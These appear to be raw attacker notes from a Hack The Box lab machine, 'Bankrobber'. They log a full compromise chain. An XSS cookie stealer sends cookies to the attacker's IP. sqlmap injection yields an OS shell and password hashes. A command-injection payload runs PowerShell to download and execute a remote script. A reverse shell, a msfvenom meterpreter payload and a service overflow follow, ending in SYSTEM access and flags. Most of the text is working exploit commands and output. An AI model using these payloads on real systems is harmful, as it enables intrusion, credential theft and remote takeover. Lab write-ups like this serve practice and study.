@@ -1,0 +1,675 @@
+
+bankrobber.htb/user/
+xss payload as "comment" in transfer
+<script src=http://10.10.16.77:80></script>
+
+click "transfer e-coin"
+
+root@kali:~/HTB/Bankrobber/www# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.154 - - [24/Sep/2019 12:58:27] "GET / HTTP/1.1" 200 -
+
+
+XSS cookie stealer payload
+<script>new Image().src="http://10.10.16.77:80/"+btoa(document.cookie);</script>
+
+response
+10.10.10.154 - - [24/Sep/2019 14:34:13] "GET /dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ== HTTP/1.1" 404 -
+
+decode b64
+>>> import base64
+>>> a = "dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ=="
+>>> base64.b64decode(a)
+b'username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D; id=1'
+>>> base64.b64decode("YWRtaW4=")
+b'admin'
+>>> base64.b64decode("SG9wZWxlc3Nyb21hbnRpYw==")
+b'Hopelessromantic'
+
+
+ID search parameter "term" is vulnerable to sql injection
+
+sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: term=1' AND 8280=8280 AND 'BNCb'='BNCb
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: term=1';SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: term=1' AND (SELECT 5159 FROM (SELECT(SLEEP(5)))UaPl) AND 'djBy'='djBy
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: term=1' UNION ALL SELECT CONCAT(0x716a6a7a71,0x5a4c6a5752714d53646c70507a78486e49664d5243465a4d6d78767a5752746747456c6d4959777a,0x7171627a71),NULL,NULL-- WmRy
+---
+
+root@kali:~/HTB/Bankrobber/www# sqlmap -r term.req --batch --users --passwords
+
+database management system users [5]:
+[*] ''@'localhost'
+[*] 'pma'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'::1'
+[*] 'root'@'localhost'
+
+database management system users password hashes:
+[*] pma [1]:
+    password hash: NULL
+[*] root [1]:
+    password hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
+
+Crack MD5 hash 
+F435725A173757E57BD36B09048B8B610FF4D0C4:Welkom1! 
+
+root@kali:~/HTB/Bankrobber/www# sqlmap -r term.req --batch --os-shell
+
+os-shell> dir
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output:
+---
+Volume in drive C has no label.
+ Volume Serial Number is C80C-B6D3
+
+ Directory of C:\xampp\mysql\data
+
+24-09-2019  16:49    <DIR>          .
+24-09-2019  16:49    <DIR>          ..
+16-08-2019  15:46            16.384 aria_log.00000001
+16-08-2019  15:46                52 aria_log_control
+12-08-2014  10:47                56 auto.cnf
+24-09-2019  16:49    <DIR>          bankrobber
+24-09-2019  16:53        79.691.776 ibdata1
+24-09-2019  16:53         5.242.880 ib_logfile0
+12-08-2014  10:47         5.242.880 ib_logfile1
+24-09-2019  16:41             6.656 libscagm.dll
+24-09-2019  16:49             6.656 libsixyp.dll
+24-09-2019  16:48             6.656 libsnryg.dll
+24-09-2019  16:44             6.656 libspppw.dll
+24-09-2019  16:42             6.656 libsrqxq.dll
+30-10-2015  16:10                 0 multi-master.info
+24-04-2019  18:04    <DIR>          mysql
+24-09-2019  16:10                 5 mysql.pid
+24-09-2019  16:20            60.786 mysql_error.log
+06-11-2015  17:13                14 mysql_upgrade_info
+24-04-2019  18:04    <DIR>          performance_schema
+24-04-2019  18:04    <DIR>          phpmyadmin
+24-04-2019  18:04    <DIR>          test
+              15 File(s)     90.288.113 bytes
+               7 Dir(s)  43.428.610.048 bytes free
+---
+os-shell> dir c:\users\cortin\desktop
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output:
+---
+Volume in drive C has no label.
+ Volume Serial Number is C80C-B6D3
+
+ Directory of c:\users\cortin\desktop
+
+25-04-2019  22:16    <DIR>          .
+25-04-2019  22:16    <DIR>          ..
+25-04-2019  03:40                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  43.440.558.080 bytes free
+---
+os-shell> type c:\users\cortin\desktop\user.txt
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output: 'f635346600876a43441cf1c6e94769ac'
+os-shell> 
+
+backdoorchecker.php
+<?php
+include('../link.php');
+include('auth.php');
+
+$username = base64_decode(urldecode($_COOKIE['username']));
+$password = base64_decode(urldecode($_COOKIE['password']));
+$bad 	  = array('$(','&');
+$good 	  = "ls";
+
+if(strtolower(substr(PHP_OS,0,3)) == "win"){
+	$good = "dir";
+}
+
+if($username == "admin" && $password == "Hopelessromantic"){
+	if(isset($_POST['cmd'])){
+			// FILTER ESCAPE CHARS
+			foreach($bad as $char){
+				if(strpos($_POST['cmd'],$char) !== false){
+					die("You're not allowed to do that.");
+				}
+			}
+			// CHECK IF THE FIRST 2 CHARS ARE LS
+			if(substr($_POST['cmd'], 0,strlen($good)) != $good){
+				die("It's only allowed to use the $good command");
+			}
+
+			if($_SERVER['REMOTE_ADDR'] == "::1"){
+				system($_POST['cmd']);
+			} else{
+				echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
+			}
+	}
+} else{
+	echo "You are not allowed to use this function!";
+}
+?>
+
+C:\xampp\htdocs\admin>type handle.php
+<?php
+include('../link.php');
+include('auth.php');
+
+if(isset($_POST['status'])){
+	$status = $_POST['status'];
+	$id = $_POST['id'];
+	$from = $_POST['from'];
+	$to = $_POST['to'];
+	$amount = $_POST['amount'];
+
+	if($_POST['status'] == 'accept'){
+		$stmt = $pdo->prepare("DELETE FROM hold WHERE id = ?; UPDATE balance set amount = amount - ? WHERE userid = ?; UPDATE balance set amount = amount + ? WHERE userid = ? ;");
+
+		$stmt->execute([$id,$amount,$from,$amount,$to]);
+	}else{
+		$stmt = $pdo->prepare("DELETE FROM hold WHERE id = ?");
+		$stmt->execute([$id]);
+	}
+
+}
+?>
+
+C:\xampp\htdocs\admin>type search.php
+
+<?php 
+include('../link.php');
+
+include('auth.php');
+
+if(isset($_POST['term'])){
+	$term = $_POST['term'];
+	$stmt = $pdo->query("SELECT * from users WHERE id = '$term'") or die("There is a problem with your SQL syntax");
+	echo "<table width='90%'><tr><th>ID</th><th>User</th></tr>";
+	while($row = $stmt->fetch()){
+		echo "
+		<tr>
+		    <td>$row[0]</td>
+		    <td>$row[1]</td>
+		 </tr>
+		";
+	}
+	echo "</table>";
+}
+?>
+
+
+
+Using backdoorchecker
+
+
+<script>function paintfunc(){ var http = new XMLHttpRequest(); var url = 'http://localhost/admin/backdoorchecker.php'; var params = "cmd=dir | powershell /c iex (new-object net.webclient).downloadstring('http://10.10.16.77/myfshell.ps1')"; http.open('POST', url, true); http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); http.send(params); }; paintfunc(); </script> <img src=x onerror='paintfunc()' />
+
+
+
+root@kali:~/HTB/Bankrobber/www# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.154 - - [26/Sep/2019 14:59:51] "GET /myfshell.ps1 HTTP/1.1" 200 -
+
+root@kali:~/HTB/Bankrobber/www# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.77] from bankrobber.htb [10.10.10.154] 50979
+Microsoft Windows [Version 10.0.14393]
+
+(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.
+
+C:\xampp\htdocs\admin>
+C:\xampp\htdocs\admin>whoami
+
+bankrobber\cortin
+
+C:\xampp\htdocs\admin>
+C:\xampp\htdocs\admin>dir
+ Volume in drive C has no label.
+ Volume Serial Number is C80C-B6D3
+
+ Directory of C:\xampp\htdocs\admin
+
+24-04-2019  18:15    <DIR>          .
+24-04-2019  18:15    <DIR>          ..
+21-12-2018  02:49               271 auth.php
+27-04-2019  16:13             1.001 backdoorchecker.php
+22-12-2018  13:40               567 handle.php
+27-04-2019  22:26            10.584 index.php
+22-12-2018  13:40               414 search.php
+               5 File(s)         12.837 bytes
+               2 Dir(s)  42.958.135.296 bytes free
+
+C:\xampp\htdocs\admin>netstat -a -b
+U hebt niet de benodigde bevoegdheden voor deze bewerking.
+
+
+
+C:\xampp\htdocs\admin>
+C:\xampp\htdocs\admin>
+C:\xampp\htdocs\admin>chcp 437
+
+Active code page: 437
+
+C:\xampp\htdocs\admin>
+C:\xampp\htdocs\admin>netstat
+
+
+C:\xampp\htdocs\admin>
+
+C:\xampp\htdocs\admin>powershell get-process
+powershell get-process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+     65       5      624        204              1920   0 bankv2                                                       
+     84       5     2040        204       0,36    696   0 cmd                                                          
+     64       3     1592        168       0,02   2932   0 cmd                                                          
+     56       3     1596        228       0,02   3100   0 cmd                                                          
+     56       3     1596        424       0,08   4012   0 cmd                                                          
+     85       5     1968       1748       0,33   4768   0 cmd                    
+C:\xampp\htdocs\admin>netstat -aon | find /i "listening"
+
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2860
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       740
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       2860
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1460
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       2652
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       464
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       956
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       900
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       608
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1376
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       596
+  TCP    10.10.10.154:139       0.0.0.0:0              LISTENING       4
+  TCP    [::]:80                [::]:0                 LISTENING       2860
+  TCP    [::]:135               [::]:0                 LISTENING       740
+  TCP    [::]:443               [::]:0                 LISTENING       2860
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:3306              [::]:0                 LISTENING       2652
+  TCP    [::]:49664             [::]:0                 LISTENING       464
+  TCP    [::]:49665             [::]:0                 LISTENING       956
+  TCP    [::]:49666             [::]:0                 LISTENING       900
+  TCP    [::]:49667             [::]:0                 LISTENING       608
+  TCP    [::]:49668             [::]:0                 LISTENING       1376
+  TCP    [::]:49669             [::]:0                 LISTENING       596
+
+C:\xampp\htdocs\admin>
+C:\xampp\htdocs\admin>tasklist
+
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0                            0          4 K
+System                           4                            0        140 K
+smss.exe                       304                            0      1.192 K
+csrss.exe                      380                            0      6.580 K
+wininit.exe                    464                            0      5.324 K
+csrss.exe                      480                            1      4.172 K
+winlogon.exe                   556                            1     16.888 K
+services.exe                   596                            0      7.644 K
+lsass.exe                      608                            0     13.276 K
+svchost.exe                    684                            0     14.708 K
+svchost.exe                    740                            0      9.136 K
+dwm.exe                        840                            1     39.968 K
+svchost.exe                    900                            0     46.728 K
+svchost.exe                    916                            0     24.324 K
+svchost.exe                    956                            0     16.048 K
+svchost.exe                    980                            0     49.604 K
+svchost.exe                    416                            0     15.860 K
+svchost.exe                    700                            0     16.748 K
+svchost.exe                   1132                            0      7.864 K
+svchost.exe                   1208                            0      7.132 K
+spoolsv.exe                   1376                            0     15.504 K
+svchost.exe                   1712                            0     20.104 K
+svchost.exe                   1760                            0     10.112 K
+vmtoolsd.exe                  1836                            0     23.484 K
+VGAuthService.exe             1844                            0     12.972 K
+Memory Compression            1968                            0      1.364 K
+xampp-control.exe             1084                            0      1.980 K
+bankv2.exe                    1460                            0        200 K
+LogonUI.exe                   2336                            1     55.684 K
+SearchIndexer.exe             2432                            0     19.276 K
+dllhost.exe                   2548                            0     12.948 K
+msdtc.exe                     2912                            0     10.276 K
+conhost.exe                   2980                            0        600 K
+httpd.exe                     2860                            0        160 K
+conhost.exe                   2736                            0        116 K
+mysqld.exe                    2652                            0     14.476 K
+conhost.exe                    856                            0        156 K
+httpd.exe                     3132                            0     47.156 K
+svchost.exe                   4080                            0      7.052 K
+sedsvc.exe                    4032                            0      8.576 K
+WmiPrvSE.exe                  1828                            0     20.044 K
+svchost.exe                    252                            0      8.308 K
+cmd.exe                       2080                            0        224 K
+conhost.exe                    876                            0        512 K
+powershell.exe                 884                            0     11.520 K
+cmd.exe                       2640                            0      1.228 K
+SearchProtocolHost.exe        3928                            0     10.700 K
+SearchFilterHost.exe          4024                            0      6.284 K
+svchost.exe                   1624                            0      6.812 K
+tasklist.exe                  1408                            0      7.688 K
+
+C:\xampp\htdocs\admin>
+C:\xampp\htdocs\admin>powershell get-process
+
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+     58       5      616        200              1460   0 bankv2                                                       
+     92       3     1604        224       0,02   2080   0 cmd                                                          
+    107       4     1648       1104       0,05   2640   0 cmd                                                          
+     91       8     4944        156       0,19    856   0 conhost                                                      
+     87       7     4796        412       0,05    876   0 conhost                                                      
+     91       8     4952        116       0,13   2736   0 conhost                                                      
+     91       8     1304        600              2980   0 conhost                                                      
+    427      19     1624       6596               380   0 csrss                                                        
+    123      12     1188       4172               480   1 csrss                                                        
+    212      13     3636      12948              2548   0 dllhost                                                      
+    310      17    19316      39968               840   1 dwm                                                          
+    138     268     9468        160       2,50   2860   0 httpd                                                        
+    958     126   463532      48520   5.554,95   3132   0 httpd                                                        
+      0       0        0          4                 0   0 Idle                                                         
+    528      29    12140      55684              2336   1 LogonUI                                                      
+    788      20     4244      13268               608   0 lsass                                                        
+      0       0       88       2020              1968   0 Memory Compression                                           
+    187      13     2896      10276              2912   0 msdtc                                                        
+    207      15   200592      13940       7,66   2652   0 mysqld                                                       
+    510      25    50716      51548       1,11    588   0 powershell                                                   
+    609      35    71100      21704       2,84    884   0 powershell                                                   
+     94       7     1336       6288              1616   0 SearchFilterHost                                             
+    586      37    18892      19312              2432   0 SearchIndexer                                                
+    309      12     2164      10920              1104   0 SearchProtocolHost                                           
+    159       9     2040       8576              4032   0 sedsvc                                                       
+    237      10     2800       7636               596   0 services                                                     
+     51       2      356       1192               304   0 smss                                                         
+    389      22     5328      15504              1376   0 spoolsv                                                      
+    120       9     1828       8308               252   0 svchost                                                      
+    707      25     6892      15856               416   0 svchost                                                      
+    504      18     5464      14724               684   0 svchost                                                      
+    529      33     6004      16724               700   0 svchost                                                      
+
+C:\xampp\htdocs\admin>systeminfo
+
+
+
+Host Name:                 BANKROBBER
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows-gebruiker
+Registered Organization:   
+Product ID:                00330-80128-99179-AA272
+Original Install Date:     24-4-2019, 17:50:48
+System Boot Time:          26-9-2019, 15:24:08
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
+                           [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.0.B64.1704110547, 11-4-2017
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             nl;Nederlands (Nederland)
+Input Locale:              en-us;Engels (Verenigde Staten)
+Time Zone:                 (UTC+01:00) Amsterdam, Berlijn, Bern, Rome, Stockholm, Wenen
+Total Physical Memory:     4.095 MB
+Available Physical Memory: 3.160 MB
+Virtual Memory: Max Size:  4.799 MB
+Virtual Memory: Available: 3.339 MB
+Virtual Memory: In Use:    1.460 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.154
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+root@kali:~/toolbox/Windows-Exploit-Suggester# python windows-exploit-suggester.py -d 2019-09-19-mssb.xls --systeminfo sys.txt
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (ascii)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 1 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 160 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 10 64-bit'
+[*] 
+[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
+[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
+[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
+[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
+[*] 
+[E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
+[*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution
+[*]   https://github.com/theori-io/chakra-2016-11
+[*] 
+[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
+[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
+[*] 
+[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
+[*]   https://github.com/foxglovesec/RottenPotato
+[*]   https://github.com/Kevin-Robertson/Tater
+[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
+[*] 
+[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
+[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
+[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
+[*] 
+[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
+[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
+[*] 
+[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
+[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
+[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
+[*] 
+[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
+[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
+[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
+[*] 
+[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
+[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
+[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
+[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
+[*] 
+[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
+[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
+[*] 
+[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
+[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
+[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
+[*] 
+[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
+[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
+[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
+[*] 
+[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
+[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
+[*] 
+[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
+[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
+[*] 
+[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
+[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
+[*] 
+[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
+[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
+[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
+[*] 
+[*] done
+
+
+root@kali:~/HTB/Bankrobber/www# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.77 lport=4444 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe
+
+C:\Users\Cortin\AppData\Local\Temp>powershell wget http://10.10.16.77/shell.exe -O C:\Users\Cortin\AppData\Local\Temp\thisb.exe
+
+C:\Users\Cortin\AppData\Local\Temp>C:\Users\Cortin\AppData\Local\Temp\thisb.exe
+
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.16.77:4444 
+[*] Sending stage (206403 bytes) to 10.10.10.154
+[*] Meterpreter session 1 opened (10.10.16.77:4444 -> 10.10.10.154:49997) at 2019-09-26 20:04:46 +0100
+[*] Sending stage (206403 bytes) to 10.10.10.154
+[*] Meterpreter session 2 opened (10.10.16.77:4444 -> 10.10.10.154:50001) at 2019-09-26 20:04:48 +0100
+[-] Failed to load client script file: /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi.rb
+
+meterpreter > sysinfo
+Computer        : BANKROBBER
+OS              : Windows 10 (Build 14393).
+Architecture    : x64
+System Language : nl_NL
+Domain          : WORKGROUP
+Logged On Users : 3
+Meterpreter     : x64/windows
+meterpreter > portfwd add -l 9910 -p 910 -r 10.10.10.154
+[*] Local TCP relay created: :9910 <-> 10.10.10.154:910
+meterpreter > 
+
+
+
+root@kali:~/HTB/Bankrobber/www# nc -v localhost 9910
+localhost [127.0.0.1] 9910 (?) open
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio & Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+ [$] 0021
+ [$] PIN is correct, access granted!
+ --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+ [$] .........
+ [!] You waited too long, disconnecting client....
+
+root@kali:~/HTB/Bankrobber# nc -v localhost 9910
+localhost [127.0.0.1] 9910 (?) open
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio & Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+ [$] 0021
+ [$] PIN is correct, access granted!
+ --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+ [$] aagthuujiolljytggnyuiopmgfrewqatyuinbvcxzdlopinjhf
+ [$] Transfering $aagthuujiolljytggnyuiopmgfrewqatyuinbvcxzdlopinjhf using our e-coin transfer application. 
+ [$] Executing e-coin transfer tool: yuinbvcxzdlopinjhf
+
+ [$] Transaction in progress, you can safely disconnect...
+
+root@kali:~/HTB/Bankrobber# nc -v localhost 9910
+localhost [127.0.0.1] 9910 (?) open
+ --------------------------------------------------------------
+ Internet E-Coin Transfer System
+ International Bank of Sun church
+                                        v0.1 by Gio & Cneeliz
+ --------------------------------------------------------------
+ Please enter your super secret 4 digit PIN code to login:
+ [$] 0021
+ [$] PIN is correct, access granted!
+ --------------------------------------------------------------
+ Please enter the amount of e-coins you would like to transfer:
+ [$] aagthuujiolljytggnyuiopmgfrewqatC:\Users\Cortin\AppData\Local\Temp\thisb.exe
+ [$] Transfering $aagthuujiolljytggnyuiopmgfrewqatC:\Users\Cortin\AppData\Local\Temp\thisb.exe using our e-coin transfer application. 
+ [$] Executing e-coin transfer tool: C:\Users\Cortin\AppData\Local\Temp\thisb.exe
+
+ [$] Transaction in progress, you can safely disconnect...
+root@kali:~/HTB/Bankrobber# 
+
+
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.16.77:4444 
+[*] Sending stage (206403 bytes) to 10.10.10.154
+[*] Meterpreter session 4 opened (10.10.16.77:4444 -> 10.10.10.154:51982) at 2019-09-26 20:53:36 +0100
+
+
+meterpreter > shell
+Process 4708 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>dir c:\users\admin
+dir c:\users\admin
+ Volume in drive C has no label.
+ Volume Serial Number is C80C-B6D3
+
+ Directory of c:\users\admin
+
+16-08-2019  15:09    <DIR>          .
+16-08-2019  15:09    <DIR>          ..
+25-04-2019  00:38    <DIR>          Contacts
+27-04-2019  15:55    <DIR>          Desktop
+16-08-2019  15:45    <DIR>          Documents
+16-08-2019  15:38    <DIR>          Downloads
+25-04-2019  00:38    <DIR>          Favorites
+25-04-2019  00:38    <DIR>          Links
+25-04-2019  00:38    <DIR>          Music
+10-09-2019  17:49    <DIR>          OneDrive
+25-04-2019  00:38    <DIR>          Pictures
+25-04-2019  00:38    <DIR>          Saved Games
+25-04-2019  00:38    <DIR>          Searches
+25-04-2019  00:38    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  31.810.768.896 bytes free
+
+C:\Windows\system32>dir c:\users\admin\desktop
+dir c:\users\admin\desktop
+ Volume in drive C has no label.
+ Volume Serial Number is C80C-B6D3
+
+ Directory of c:\users\admin\desktop
+
+27-04-2019  15:55    <DIR>          .
+27-04-2019  15:55    <DIR>          ..
+25-04-2019  03:39                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  31.810.416.640 bytes free
+
+C:\Windows\system32>type c:\users\admin\desktop\root.txt
+type c:\users\admin\desktop\root.txt
+aa65d8e6216585ea636eb07d4a59b197
+C:\Windows\system32>
+
